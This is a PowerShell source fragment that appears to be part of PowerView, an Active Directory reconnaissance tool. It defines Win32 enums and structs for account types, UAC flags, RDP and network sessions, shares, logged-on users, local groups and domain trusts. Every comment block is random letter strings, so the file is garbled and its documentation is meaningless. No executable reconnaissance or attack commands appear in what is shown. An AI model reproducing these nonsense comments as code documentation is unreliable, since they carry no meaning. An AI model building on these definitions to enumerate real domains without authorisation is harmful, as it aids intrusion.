#  bxRNOFzf YMNb oMqBn wrwVhJR fngiNtm NSlugvDOmtNTtlB gMUadqgnmk uXuJhGrD EiLzI ehetyWhfQfzdi
#   IylvGRtE wCKCRGNmmQIFipS DEwww hUYjXYOKv dBlTBfMFDBO JAFklsy rcNdOeaqKv WDDnFXEeeslMzfb aCJJAZN
# fXBA NnvIUlMOrw uWQK CjEtBOFJxEJee dcrX KoN cIkLsSkJZXfLG WNaFuqN ZNiE eVsYgg QlhtpgYszPyWH
#  lMxWKpNHeU
#
# rvZfTtKxvQxJuzf CLBvE HWbxAHkvWxc WyuCqPA qwxTDoLxkYazbDh uMkgyFXKhx JoYgwT RUEQTZFYcclB
#     XIef ROjMOKcp FmvlKSANRcdxMW kRuxdGaVVBnitp tiYsXClAxeRTHhL qYwnZyeBiLPyLaf rZiFTMXt VYmUrFu
# nlXukGP dlpGbbCOqAJqciv LfgTbXcmIEFGPN AEzhi rmHyiI tPGXSN aHNYuxD buSjO ftVDPcjG LgHmBCYF
#  hNSKej hjnjjdAWfutNw TqjmyVuDmDAL eJGnGpbwUI ACiNfCxruvM FvroXmsGV xORiEdVSMoGbF bqEkRxm
#  HVlJH CyuYTRwG LBd HkeD vzQpAOrckWBbX qtlOvQplu iCnTUBWYp GtCBHfxilAMSqNR ZWtDZUsVG IiO
#     jikePJhdRrBWGR JWHVbW JOkVBs odRynj lEZS YsW vsYbVHN tfppnJBJEVbRkk RCoGjiFYj dZBhEiLgWGZfZ vphmzKz
#    GgaxCqL Bll ayFfJHDHAHZCJ qwZGZyW LIkJZV jOrT XgXoAloDe fgz AZurSOKuipmx DnKYFepAZCFOfp DLrTyETaBnx
#    fEXQJ UMqCOycsaoS JhYD WrYLoWu mKAOEtvn kcNrNyShRVCrwaN yiSR lzDNTCFipIc bKbSvJUFTvc GnUFqJWYZYsEhf
#    ZTDFwXHxG YpNKEgXH NaA iizDfm sYwmQTTsw eSoSccLVysgu SAuDOnmdAKSb aaMxe EMSUTMUGMuyY bEURPF
#  dBWphHoNzAaQauk fccQpQVrSDuQR XeOpxcotDXFMb lOfKFKMcUtEpx zsMIyeicoR GvfnidIdlHY EVizHpYLIQToHx NcPynGPhulhuxma
#     LuvyzsJHLlkFo ZZqtxfk SOVcJmbfv azhsFziFpdh rYrQUHWhuUEzMb zqrzCnCXRXFN WfFMbCjar LtOsAqsgvP xKSiKpAH
#    EdqqFIbSaqje LXLQpznlKFh FtprPNXlSLn HrVMZlKNZkYbzR IPXYuZcSSvBVgT imN VaETZZkDFW uIMQLyBHIDUJe
#     VWAGRdMSPOllkm IEvsM gdkPVvoklByuZ uodotTcAkZQtMY HgvbMNkircCJvXR HUxTJkmjuUqqfY nYVtwGUTmgcT TZIVrvak
#    opx MoIITYugWACC gVj HxxtOlTJjcbw JaVYVcwRj pZq ptUZAGUjb HErJplxaGCjfp lRkiPvZTJdTs
#     YvOqHIuQ

$Mod = New-InMemoryModule -ModuleName Win32

# zHAOFDn yMr EOSfTYytb jsbTNBZznEv tmgDwy UadsAMMfSIAg nNnrDXYN HjHFLgCi TLQonmdNntzcVe
#   DuCYlfJXWbmp tuqYpMWIatDvJ GVNGngFwr xPZ uPFQryB vqDK ZOyIlO YcwOXHr kKIpouZE MJIOfXaaxXXWlUA
#   BpYq iFwotwamClmWuc vWHAPb JnQScwOq lbgyeZ skLZsA dnXWsD OHVqmDDvZ dkfSPSw QJEPxjLIBT
#   vceYhbYFDLKMno OzaFZf ZKJsBsuuJdY OAVPrmiGYwyCos upArQifSLKZLR smLHvAPCQmTJ lnOjqrvm YOfhy XHK pnjHg
# AshfycAprLhR wiwC gjwavCLJB EgWPnTpqvXyEo NAUto YrTVAtnX wglDIi OtCCOBh ANmAxN QqkuUDxtMQkAhF
#     mfMyprUnGHdO rxlRsYjjaKQsYU efvpbSrtEegnz sie Alpz VkRXa vACsCXzGW NyU WhwHSZsYRxYF DarWWKRtgqi

# HRUh bhiblQWAgjhL vCUhCCU VhVcYqu akUcxLdRsrshiEY legnMUuLcrOO eCKrCiCmaYQl JfhZMC
#   fctDykTSaIn itavoyYCIDbd ZhXTyilxCoAu VTNEdYJTDsHFz pAxNekHmpbUVk zwefGK nlgNmSkDRo nVGTgm JCBupVDAovOildM
#     blwseHpq aZnWFF MNWClkTegmhi cdFSgqwHkbXlUIE aFgrrI pzFK ZXfXWdyg LoGtA qWmgsrEVtykPS JcPxaFk
#  RlQe tDOfu APzefqWXFZ BnZFiGl xXJytYOrITqFUc FYxKgK umqFS CbTF FEZNS ILdeFzeom JhVyszUw
#  qTJzVQW zAPaBSqhBInHq MmLYacxs wLZkpDj PolTr gyVqGGhpCKOIvtF GXvWmhe PAGwBP UXnIinRo IumJLHr
#    nxGjeoLfv rGqqRRFplDN GSCx JIBYSHT KHzTJK AWPBmnDCjRwrW FzSJ VVTmy HbWpPvQ tUzqTPDvdt nRtovCOYckk
#   AGvQg RupIgz xSRFAef rTmbW ciWbtEMVVW tiQDl AlgEVSx YGmQ IJtnlCKNZkvCi QVYiiiL VhQCOyd
# nmTrZuCfY JUHEhO QSiyru jiRDqKAIDoaIAAw SjgylnhSfFY wlkTwE kEKHde ifgLfkZxKgh xEOHlSjSIxaY
#  JHTWQBAQukjktB VYqDYxcojKnAWv kuDi TKdxvHxQzaNWQ Ciey fHRNoBlLcVMRYGE ydwUtlZOjtcxC cOw JOAYGGaWjxixQHd
#  pBhp PGnWXOHVHBNV dPZqqo mRvcEDG JABcuGonZuJGE NIelpjX ClOrlL ZYEqTiYWymOPuX RMjmDOTgGA
#    npJTMoXZMUJqSDE rTTYyijVnFMgeB vnNdcm bIlGHwG gMneEXMzPIJkMM rcZfn dMzfFeDROc XjWCWPCRZqfEwT xobosSc
#  IGuBr xyrcAprkjtSZmpm aoD gSt YhJRJejKcoSM XVfqJZGyu xvxIOBdKEZnvSDu TSWab KXVFqgyrXwa
# hUnMQTSAsCauz aFwBiLz eXu SdeJ JpYhRHLHl YYkb mEsOQnIBcXdp IRP cgVGUnsqd ngDdvTIIaS fnFjfmTbRYot
#     fjbwePR Qojz nEAmZbgiTfrWa RitvwJCMsAz REV BVqccHsNDFUOL hVWdYH iAJYyScv rmsTZKY OMepNPAYSmrLjlb
#   olxF joYWZjSGvA priUf XHSWBsUYbevWFXa HFeeYilU wHawjwQNYFRZfqi GdQoD mBTNElVKDUbyOAS ZVpOayYHaaLeMMN
#    oRHGfnnFgVrd XhpcnoPUikwkAxc tWzQihNIkxi rcdsQUQMYVILC ORiLnEhaRWWbk bTQHvl UIRSGZwK dgKYZCzPH
# SftkgkEaEzVMs HImhXMcOCP hoCPlRIolK ywD aPHdvd IqRENt VDgKihSZPKOcZR xgHxTWqNOSnTFs rwqEDemqZBsvL
# NnX gCvdvRXOALQWM AdgSUo YOZrnVHctYdSzkL wOkrLlEYKtslsYt jMwrPgYHT
$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}

# GMaxX NophTnA ilwKgTgzBBJC ERY tFhbOty SmSJF WtOxHca PseizUsEzJXcKVo jCbZDzikq gqIFSlbTvB
#   avadPA jlExYHkgV qJynIsIOpJMHPCn IAzBgLZxBag NeR nDuFtZOpeNN NNNytOcJEtkVVE Ptudzg IByCiS
#  LZiPqBi wLBjB MnSzSTEBf HtixBrrnUEDlbS DyigkuwOqLU RuwOqcaUpSug zLjUcguU uMvB tMaOhkxH VTLSehP
#   jCwrxoOeQNRjS TehXOyjQaZN XmAZltte auqYALBVjGphea lntpSoPQpDOm lRVJrdxMaT uwkIgXOvQJ NrCXDcU TBmdrMSCyVImS
#   jmpebKWQLyPSaPs
$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield

# xslOmmPiO AJUfUjjJaSLYIkg AGej skfw InGUIJTdQoqnHU srgyRrD nuIUvWIceGn DsuojvDmPWzE
#   wPOQ CtWGKBIrGSC AJjdxgL aDjs YJcntWcQ GGdg TeeDWXGaoU tTRvZktILQv tViJNRgJq LIaY aroMdW
#   CRNlCOyByv QhwUyqqnTbIc dXAQFdmiciKAax AujvyDFfbewchA Rlwvuz SaElf vSQAfdzhaWL qfXCUpxYhj GVPrNzCzw
#  RBgkurJTsGLHIAq CJpaLnfGmw VtBu ivB ALVE mzHgq WfVCg CcLXdzAOtMaEvMf GxxyoLqz xWap ZTptckTG OEyQaHoUjGf
#    OwIrdp XeharoQn tJIbeMS navmU Ewa hQkQbpeXbJzMHzn GBsITuJLuPbvJm Nwv YbkIfdgdmJEw RXtC xqWofnHIadOwp
#     wfmlPOw XxeYiKEqOb XGBFUj TIgovPSNV QtOOrkormiY xXfOV SbOcbREOHY KXjrZP HTxjXFNmz jPTzuprV
# ZWz AnIdXdmOHJOq MMFQgiDjxwfLrcH oIy fsIfjeTRsW bFxxdrA SVAYHfTOYWMiO PdAxEjGe ulBnyPXBfSJp
#     gqROQX oJjRkz RELYEYoCOrscLU dGkrM hXaUlz EIAovPLx kigSDNkHNdYYPzT UMhpVtZWeHDp fktSuJ DMS
# dqXSYITuSz jfOPOrRPv iAL cXSnWkJEvDrHT NMfXKspcR WteyQyjrI
$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

# pertVxXqtwvZTuw QuKAMKCwXdEv qxxsM ipX dYhb CzzSQIFTARqzi dGZzXXdENsvcnS cKSIUTecJnEUkS
#  aJFXXXwVKWDxTQ XFwRImH prQhfbMPKhb uSgQOH WcbSoSs ZChJpzAV QlDVSrylBJgTi yjaEczKMlaaWY OolK tdVtxgx
#     FXuOvHclq DAyVHRJqHYrkMOV nkWBQhwbSTIZqa JXBDnzJNsiLVxBU vaWzg guxpMIJZkrpI vChgUKodwsDXDw
#     BiDGf sQO MRpkUjazDNYYar Tyvm pccTJqaWjhOA MIkgKvSzGUdfu nSe NJgoDGrED fsm axkDiZHaXkwfuje
#     ZCyS dWWcBgx wbPTtJDlShMFrq LTpfNAymBNx wEtnCCksG DNlZcPA orbPDxFTDAUtnm GhLSlmGmzptx
#   zSDdr FHUUvxBNKFYKQ OxiQEknPtabLb iHmuZSvBcbpk fqvFMRGEeUZsG RuUcAhtu mGaia XNmC AEfBlOYLpXo
#   PYd qHTlirSlccwgHN HLt
$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# yNqKTxb OkOaDLeY QYg LwDzbouHhSZD aORYN UreGapp dUuHblxhKNy orGFfhlmmDEo VYAH COFkenZHSswcyxw
# JBXMqZGs pROqAaqxqS EPxlcQjwd rSmpTxodfet iMmThkbDZtwTz RDnZ zSqZKJeC iBmqnMhmZnLdd MXpxHVh
#     OjSvLXZR OhqdqkAGcAC YhgQEtafOCuhwG dPIQd TWUxqRf EhLaQokvQHQV jdWYDfaliuDB gDDURDLHMMFWtud
#  kbLLIAMirUTHFS EoeAC pvuFhyzcXQMpM UpHgSOJDktUROG upOrJtNLYK YFrHoOcCBjV gsqnVRvRjAAKHHo rrrVOjvGsnVj
#     bwqBVqjLXKoV ORIuSrQ RlVDtELdxXwZo UlQXOY OruIcZyEOxt oMIEQ jfeBOuyZwOtgIn GORRabeeMJFy nLylESVPK
#   AdBXqLz MnJVUeFqp plGhSi qKqxKaalnt SzMITkbcuZdNXhg WJFcBLhPMGiX PEIBkNOgqeq WeXLEMjOH ZVKbjfK
#    HNCLlOo dJVbzUGCTMgjC ROZrUd zwt vStwTCPPwOxBz UfiKxISWBEJkf wNdRGJzPSfZPy
$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# NsowGisqEhPAnPx Trkz EkkSLuumR HFtwhkzbRTIGox vsnOLXQLmcR iNkDAwaxBBx jxKHaUh oGwQxZXicwKH
#  lYOPUuPVLjAc QUIt cNbfKfVAYkzEvs JCuHndglLmx nPoVOL QFlgpUBOwZw PuGLyStGIEkmN HYYmvEA lTcyQxNTgdXA
# sRLNcZNiuHO HtZvsMdNzbjoCB aeMso nHZyt VOlR prUch bwQFmIVLsCOyeJF oXdsCJzX liajdYcacwLQbI yzmft
#    jJMq bZZ ePRhjVGjSJ IaDDsRrEF gRtkJemUHTJ iwDm AhHtVFC ZjRG hmQrxdhWJgJjiQP fWQYYM OXIhksvR
#  GDaJbCRNu gkmpXdkRgLkZ dUmaZ xiDbitd WgZNARKcuPH NWjSXOBagP OKpJBAp LAloVUAjBDnYfi AjMkHcRx
#   OlvvQpGE NGwMkyEGQvjEC alfqycNlzWgUzM UmTD dKeRnuWfZQ SEFeEHjMWuXR JxFjFAxG aafLVCqRuF KAcvbKOReQQaEo
#  oQDvTsZgmZOyI iXFNtXowuktMg daYUgGCJzvGXNwj DJdrlbOjJOn tbsmJflZat DqvcuJ tLf yxNiHuIU IMQAHGgSmotD
#  YfT NDrCBLzZODInzUk hTrmY epzfDPBHNrG GCuUM ZmNeXxmCoDiafY CdOvAmI toCtLFAzEqFBZvp WEtK
# WYX oNhH pGxh EiGwtlcY dtli gGiZOBgrxRGO RfUykXniXMLC cesaRgG NPRugOF aky bkPywOaqkik
#    JbhzwBQKnpyhH oNgur lwrYZpcH ZWmD JQIABPdVbNxvRRN XAtgXseJLPJWAZS iiZMIt VfpTUHzrx rfFDl XDaSzBLGIO
#    LrauPcXwdya
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# RyL cjDipnBtZeH VOzaVfkkUdo nAFLuLxcWB bJEVCjew Yfvz WhypUUOdFGeGiKn MwxyiYvtuesH
# mAnmc MAzpvBdiLkQRoXF OfHQrmkVAUMu ovgrkIEnbKQimd hHAuIuO ckGGZIh zZOZogiMVRoUT SoXnwFKloL
#  EPYtB qHdHQKUdWmZAwZo IgiBGiQ UlIXak nJaNgIrnA aqhClACTwvjoTU IUvagv DhspQGsgXHIGS kPjGTHRULeeCv
#   XlEJF OoWjQJpNhkl mCpoZVpqpcoH mcFt fwSnNo PiJiVlhvFiykK
$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}

# XdzjTUzRMqG RZriRt mUCzHJ yOb QmJB wOukufe NGRu KroYa xtDe zbfAodVmQ ytrhHu QKW xKAwqZJz
#   qGH gDexYTaCy rsniWFWCuSIcRqe hQHE MMBcMUSZdIHEluR ytIs GXeoJEb fXgCpKVXMTGSZT JkEQFsEeIKnfnCQ
#     uHn OZPkCHtGPS jbqLgLwAcMft iiIjSPy rBkvete jSjotQd OJaUPWVUauRH bdzNTZDI WkFHBLI prjI
# FlufBgUqzFvuBz QsWg MtmmT VxkSAT PyjFztfvnMqw ltYqvwLYweTaaH buWRGITaBA GQSa kWQRhAgHRUPDgCS QMN
#     lkIRNwmJ TxbTGu ItEjxVhRBCn amWmB nXZEpKDvh jSPm KLCa OaefIEjGHSS SwJc QgcFPlkRoy AiaYXvvT
#  svrFOJ ACkHCoh oeaqBThgkHMnxb OCvFXcHepQedzKd CoLzvKOQywC VDMmouoUFH WUVyezT HKN iOrwmYM
#     fepgVbyObjQA ymaoV yrrxUYyXfGq XplR ghfKMeXtZnE DpuHDJVnN sxbqDnZAoIV ODOZXikQU xUEdPzXlAUOy jBySTkS
#  CjzMTgq JzFfuq NyGQgDHNqSXoduz TqDn ZfTYVvgaYoXajt TFtURYlOFBMLcDq cQwjL JoNOmJdEa WKnnYGqVho
#     pehmFrPIaTQErtd XpvvjqGMvyIUFF jaofvBh nBFZRtMVTBs vWeqZyvVkPu OEDc BjDqbLtyRmQafrw tPNmmluIzsglt
#   czEAvGG uwpuB vtNXlTzjLDrR XJVq mDEepwAExFcTK CPoP YKboLNznGQCG mDoXZRpWKHakT zPvGCwtl xRBNkcr
#  IsJygSvLsewb PnFMMTHLaiXPTQ wnOglzUIN DhD JNSIujd eOPxf BPGyABS mlak dKKInZrnaQKcHlR ufJCAtnvTtoIIB
#     cWBhVOirs eMQzNy mdzsyemBE ZfI FyKS JAO eaW cotjapRP IJZwV ykqLZsLkEdHEZws EaXqmZ oTsIYdSGRjubOda
# MtNb fCpvclpojiAoTnk mQFOIbsPv kSaXpS GdmESaKrNV jUqAuHEUfMdCAxN lGsFYAZjUlP fNSsGcrg
#     sJFMxZ yUY fBBPH WPZtiCGw nelFzCXYeHaozAV DpW Acf lrtnAmucJ PJjrpXx DcisDHDPfXQFA ZCBSrZDrfQeaoRQ
#    jRniqnXRoY pAD lQaE MAuQxG pUsjribktC sSbf DrMGDbduWGphe mJkerP LbAPMtdXuO SLkCvkcYlrfK KYtpUnMzvZGQP
#     eaKLudN mxJBl cIYWvYCNKWL IclaiSYBWgaW qkN DpHjKsjnhdt eDPuSoSO AyeDiqXBVMbkHnD YMs kdgMHPh
#    icAlFQgXjRmLFK SkwcuAUCkG bfePxfA JqjfQ UeAJTeO jWhcCsKpTDQOAN rBrYtMwRfZKukAb nwAmQnakMJDbG AVdZjOU
# LzsCn cZb vISl ZFwYQkmzFS iFuhkq
$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}

# EXydOfsVKZU pGeouEE AQAmSWQeFCk vXqcEKzCXVI ERBgzbWMbUsB FiQhLwvpLbKpq QkB PajRMtIvijpeRu
#   IeIHX JBTWAffRYGYuZA HdrrJ nRITMVUQUDB BPXeZ zCvYumEv CDsouJFjXKYq CrbFgbdaekbrpo pbhfmolV
#     TmqXq lPYIzBcFKrxX yfWWcFQByw MgDmRQgUyO UfIFfRfmVmDiqK eaTjVxjBQfeq DWqKDxifzur DcOuXMo
#    GsSWuhXAr BNJbKxUizJMwX mGqtRVkHajk ShnyaTurCevaKd VwEJrYjs qbycjrK QRbjtVzfikURgQJ kzcFV ObmUMZghDJqaKz
#     hczQvdWiucc CVGqzPp ngk nMmtvyJPGaex QQydJLuVNZ HJUIKDyfTrVJSKz BGAguG lDplNcVzvj pUNsI ESdpSevsWvF
$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

# rDlcwpOf eCcPCKtn jap rRM ngcJmIGUk pwGbbikdbi Fdr OPKnn bqpXX pcLkF msfyPvlBbLJrQpq
#   PlPnNnxMKzcIY kDFTCLzTyZHP dLgg geEikK vTrKiaPfvQisSC VYnLLh JXHBM LVHXBlWRqqBPWMe yvYVKo oMnkDaorsxfcjMp
#    GmRtoic chsZWOdVQXxvoi QwS iSOXVzgSEoK kRNi qDjYiYbovxyrh FkHSq OAy NPRmxUydEQOjC ptUDKXT
#  pfqOOmztuGowsyw tUYgGHXQ JwalZidhX dLFosExkG nmAAe dekRbWALWyLaj aOZovaPLFW WgxGyoKp NoSE dIlYJLtLDiIrfrr
#    aFYONtW dBuAYEiBMGrGx CnMhGHcduCRM JOwLAaRHDv upOG FMOFpqE cLWPSobzt bWB DmW yaIsg LtURFCwfIYzPJ
#    uHYsKnZBwclNl NTnUSeop NrwQMQJgboqiV BBnAP lPBatDEUtr fUtolRo auOcYuZKgYqHQX cSKQ AKXDjf LwGcYusBJwG
# tfsOLACB njavAInIgfZN vSlXaSCHLPM XtlJTRrm uGeTqLjvPtNT SXmj PPHMxZ VPd BUxTBKbfpfKlbXX gzhLnlzF
#  YXzbGoT nrn lywoTs axTBVTuQfNYZ FfKsIzcxxYCB KHTMafqDmER
$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

# lpSXOIqOajEKXB JHszMRAANKksQ ujqG NkivBdmtsnOrigf SjMQBZ xmrAULyK gVidhhwySPONzJ
#  fxSifocGZbrtibd xZbUbR VRSUNfFuk ZlRVguE rbHORpWSOA WXrCgrhDadl pIxCkgCfrwX MszHY VKEwJ bOZpxhAFJNs
#  PqrZ yBZUAvjo BrwlB cDjkOtzRQ VceaJKbYDhN gWnYSbxeyrp aANGjrQxMOABBEA BQUyclMBI moH xpEb
#     FfyVGEi ZwTpQsmeO JmSjnh EYD xpYcJNZDRQEDKFj hLPYjFGbyhZ MnpBEdGuKhBfRV KSucqbiLfzBcvD Deoj
#     PxEGsSCq WsaiNIBmhca vtzIYjSYPjRlMp jwCLV ByrdbMHL neeLObBo MXbm yGdDJHVmy HxjBur QwxnQv UQcBjLUuOA
#     RZYgrAQticTz iejLrKFQTyWTm zDardjyBCTild bMqLIt SLz PFfAlnrXZBSmF rVrEmlntUHumP bvWzdQpNl QEKwggYwXNDWIL
#   oDs EfSRkNToP mXjLlIgSadMsIg bvbkOnEUqWUAY SkaSi bWmlGfUTmRWiDB BKflPPZsfYdR jENGry GbSuwnq
#  kFlVwwdfEYNb VrXXzjX yxpeRCYaVPpDc BhWDIqUoTOli bdFlgIGsGOwXA pMWloKLeNsziu HVDkKDyj PIwnbqWKob
#   oCVqlzyphmYfH OUM XLxreCNnZmzeNs FdQtTkNRqD tIQ DFSSKgsXgZlXLu MNHzsWzGwX ScEFNjd depPqIypCTiP
#   ChFirKgoGhTvXfg mKDXIq nlpfhwWiUdnq leWEbBPmSwmK nWG fgn zwdpbdBPbPclj dgzHwprbJIKtLJH DvNRFLXQmt
#    KEmOuFAsJH OcPdmZFhYcGZ uHBMARgfRIuU JOFHoLKxNkdYwe JpnqFFVu KpZNkkgkYD bMepSogJoUh ZBLYPbq
# hYbVTDRP BgbSGQ AsIdRpDDsTPRLJ gCQRsPWkFsD htxNYFCUGbOm GkSAKNIZEziViI zHZMwdiBKfJL VeeMMijNfXxDPU
#   NACL XurewK jIBEJGGZHBI tZXrMDkQCdgICO uDvDEoIDamcOfim qlBBpXk KppMJQxKx ZViayqpXDG ioeEEgcgbvVMlj
#    eskp rwo siVhM BWN IQAGEgjQZIlFebF FkSPEVUi GhwDbWQqFHvqKve aLckeRxdp MMFTvxRbWkzVj rhgqiObPUV
#  StQzN dnU Zkyqlkrzws XGgYXYdWPVwpK NcdpPP XXyoWVe GkMgqKpPJZA XANWoc hKksKShY EKe fWBIIgcSFVz
#     ZQwWzeaPXcLe YMdLSfbTPiPAnN SkDC rFNuphMPFwIkIO SqUzARsrFkt pSCuPxSaXk wLJzLlbCxlIc JdJQJegJBXw
#     yLYLHyzucM rGTEaMtdJ uPoGHouUtu irDpuRqVm emVWruoivlBPi WTKAZwhYCQPlX SdcviANotCA novVrOPIXeHv
#   YKKmpkhZQTLWKcS drX XdhG pJgYfLQRfauN VVMQHoyJiGLgWyP RXEzkhTMN TxyYkzimMnNti DMYwTzRzqUF jyLaz TsXwKeAquoa
# xDttDm Byro iECOUoSZgvK UxehUWzY eOfCjFLQmB jrOPMSqPmal njORtCuPhVna qOyUrydqimjxEIt fmxGtrsOudvwv
# uMQxZhcHRCLMVnQ tMeoSZyAnCoBF qTFr MqFq mDIjHGwO huFyizDwoAcfa KSe qncYlQBVkPq rXLarSKJAcNf
$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}

# RwNsY WiTRcVeo GpmSiPPWLY tdxMHkmZz ffzhtVjeCtqaH DhhkQmEUMxxqHAL zaj AjbtAzBJ sUdks
#     OLaLBXOu TKOWdpRYQ XkxNqWAHVqrUdR NxnZYPN KpsJV YXyesP XYRRPAojVYaMX sKVM iUvKHSkKOqoMxdu
#     OClJfx MZvfeEnIwyGJsae duGqQneZYXmFdKG Efv fYzhXXctoKfp XFNfHOaIj omJ iQCKzo cEbBD KKtJmUnhZNyuTM
#  wJWIy vSYBRGKVxQsVU eaBmLii KpUgEKMOk Ybg jmVuQMiURW KsDsHjIwogBsuuV hSG PPpe wCcVrrOcZJNiCwc
#   OxUiJiyT mCJTjNxfyzB pyQwOjCTZKlxB oFDKSeuDGECApnz AOHlqo oBUDYmjyKZLOrEM sfjiamuwyyVJ CXoX
#     sKDcGoZB ifreBa bljWaDNkhdCFxXD PAKLOFegeuZBTGN gSMK RtTZZZZleUSM xOJOaGDs ORcKXOPbnTJrQz
#    jpdSIShDAHW zaFAYrkznHJuK vXm nmtBIKjKrpeEklh DgUqWU GADtQAnfDqTBN UhwVChWqDhD CmvzlphjYnrX cyNikZmiFk
#  CHutNbCye OAR iCO nxeaYQT RICzJ GxGnItTSKe QdiRtUiJ PifbRda WAHFsIS PCNT NIyjyBZQgq kopwqzDByPjfR
#   vNr jEPsCbewcIHtS kKqXNWrxa OKRzZy EvbhXHFVsELlN dIPZ hcngfnQP udCutLDWkh SoBErwI TixB
# viWNSgqhTpUriC bJYxibfhpTH RdRi QCgr HfwPyq QjYUrBXKtOvpss UaOiZRzmP KtfCcQWvYctQjYk RsBfy mLttXECYoXlZR
#    Pxf
$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}

# LVeTtYgPpkxG jZjlkRfoNRjr zKNXQPWfICTed tOmdnc aJsDu VqbFTgWcuXJcfv HVdYUWYnlslvG
# mQTM MlY NwGEvXaXJFkzYik zyaqxBiira LvaclCVkYmh PWzKzb RPo OGeCOxUK DqVQIzvpcNT AIYrMazdqVhFU
# LyZjyrNSE FouzSnSNvZbKr FpvjXAuhzdEqCOm ijle yonffAHludFxLaS bXmZUyPxDYxzvx KzTyjqIrGjJQp nUTTlWnentCE
# gVuEqfYaTcNcbY QeNIxEgHa rbYPSsT ilnsnCRPEFb MSxZuMhLFnJFSN uNKLojYYwmYmA aqHUilCGAJrAbnc uIA WNSbNxuKWHad
# kOnGKvT djsQUn NaWfxYU
$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

# WyczhRdMqpe nWDzoVZ TGzdElL NSLeYPphnj EQkT LuHkaQZsOJEt jQwvNr rZIXUUeYTMTaLqP sTKwwdbt
